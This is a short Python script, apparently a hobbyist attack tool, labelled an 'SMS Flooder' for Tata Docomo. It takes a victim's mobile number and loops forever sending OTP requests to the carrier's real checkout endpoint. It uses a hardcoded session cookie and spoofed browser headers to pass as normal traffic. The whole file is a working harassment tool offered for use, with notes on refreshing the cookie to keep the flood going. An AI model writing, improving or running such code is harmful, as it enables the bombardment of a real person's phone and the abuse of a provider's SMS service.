import requests


def tata_flood(mobile):
    url = "https://shop.tatadocomo.com/checkout.aspx"

    payload = "ExecuteMethod=SendOTP&OTPMobile="+mobile
    headers = {
        'accept': "*/*",
        'accept-encoding': "gzip, deflate, br",
        'accept-language': "en-US,en;q=0.8",
        'connection': "keep-alive",
        'content-length': "42",
        'content-type': "application/x-www-form-urlencoded",
        'cookie': "ASP.NET_SessionId=yetxu055rxubyr55oc21rf55; ",
        'host': "shop.tatadocomo.com",
        'origin': "https://shop.tatadocomo.com",
        'referer': "https://shop.tatadocomo.com/photons-c-3.aspx",
        'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
        'x-requested-with': "XMLHttpRequest",
        'cache-control': "no-cache"
    }

    response = requests.request("POST", url, data=payload, headers=headers)

    print(response.text)


print '''

____ _ _ __ ___ ________

             ____      
       _____/ __ \_  __
      / ___/ / / / |/_/
     / /  / /_/ />  <  
    /_/  /_____/_/|_|  


____ _ _ __ ___ ________


'''
#To use this u need to first get the cookie, will automate cookie capture later.
print 'SMS Flooder - Tata Docomo'
print 'If flooding doesnt starts or Resp is not SUCCESS, just change the cookie via visiting shop.tatadocomo.com'
print '#Ougrocks'
mobile = raw_input('Enter mobile number:')
while(1):
    tata_flood(mobile)